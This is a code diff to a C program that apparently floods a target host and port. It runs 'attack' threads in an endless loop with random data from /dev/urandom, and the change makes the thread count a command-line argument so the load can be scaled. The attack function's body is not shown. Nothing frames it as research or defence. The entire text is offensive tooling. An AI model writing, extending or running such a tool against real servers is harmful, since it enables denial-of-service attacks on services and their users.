@@ -13,15 +13,14 @@
 // #define DEBUG
 
 const int CONNECTIONS = 1;
-const int THREADS = 1;
-const int ARGS_COUNT = 4;
+const int ARGS_COUNT = 5;
 const char *MESSAGE = "her vam a ne sploity\n";
 
 void *attack(void *args);
 void broke(int s);
 
 char *host, *port;
-int delay;
+int delay, threads_cnt;
 int random_fd;
 
 int main(int argc, char *argv[]) {
@@ -35,11 +34,12 @@ int main(int argc, char *argv[]) {
   host = argv[1];
   port = argv[2];
   delay  = atoi(argv[3]);
+  threads_cnt = atoi(argv[4]);
   random_fd = open("/dev/urandom", O_RDONLY);
 
-  pthread_t threads[THREADS];
+  pthread_t threads[threads_cnt];
 #ifdef DEBUG
-  void *thread_args[THREADS];
+  void *thread_args[threads_cnt];
 #endif
   pthread_attr_t attr;
   pthread_attr_init(&attr);
@@ -47,7 +47,7 @@ int main(int argc, char *argv[]) {
 
   while (true) {
 
-    for (int i = 0; i < THREADS; ++i) {
+    for (int i = 0; i < threads_cnt; ++i) {
 #ifdef DEBUG
       thread_args[i] = malloc(sizeof(i));
       *(int*)thread_args[i] = i;
@@ -57,7 +57,7 @@ int main(int argc, char *argv[]) {
 #endif
     }
 
-    for (int i = 0; i < THREADS; ++i) {
+    for (int i = 0; i < threads_cnt; ++i) {
       pthread_join(threads[i], NULL);
 #ifdef DEBUG
       free((int*)thread_args[i]);
